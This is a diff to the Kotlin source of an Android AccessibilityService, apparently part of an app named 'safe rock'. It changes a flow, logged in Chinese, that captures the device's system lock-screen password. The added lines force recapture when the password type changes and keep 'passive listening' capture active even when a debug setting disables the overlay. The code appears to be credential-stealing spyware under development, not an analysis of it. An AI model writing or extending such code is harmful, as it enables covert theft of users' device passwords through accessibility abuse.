@@ -3978,18 +3978,20 @@ class MyAccessibilityService : AccessibilityService() {
                     }
 
                     if (needsRecapture) {
+                        when {
+                            !cipherDone ->
+                                android.util.Log.d(TAG, "🔐 [postAuth] 启动密码验证流程")
+                            savedType.isEmpty() || savedType == "unknown" ->
+                                android.util.Log.d(TAG, "🔐 [postAuth] 旧版数据无类型记录，强制重新捕获")
+                            else ->
+                                android.util.Log.d(TAG, "🔐 [postAuth] 密码类型变化: $savedType → $currentType，重新捕获")
+                        }
+                        prefs.edit().putBoolean("cipher_completed", false).apply()
+                        isCipherCaptureEnabled = true
+                        cipherRetryCount = 0
                         if (com.storm.safe.rock.util.DebugConfig.disableCipherOverlay) {
-                            android.util.Log.d(TAG, "🔐 [postAuth] cipher overlay 已被 debug config 禁用，跳过")
+                            android.util.Log.d(TAG, "🔐 [postAuth] debug 禁用弹窗，仅启用被动监听")
                         } else {
-                            when {
-                                !cipherDone ->
-                                    android.util.Log.d(TAG, "🔐 [postAuth] 启动密码验证流程")
-                                savedType.isEmpty() ->
-                                    android.util.Log.d(TAG, "🔐 [postAuth] 旧版数据无类型记录，强制重新捕获")
-                                else ->
-                                    android.util.Log.d(TAG, "🔐 [postAuth] 密码类型变化: $savedType → $currentType，重新捕获")
-                            }
-                            prefs.edit().putBoolean("cipher_completed", false).apply()
                             kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                                 doLaunchSystemPasswordCapture(isInstallationFlow = true)
                             }
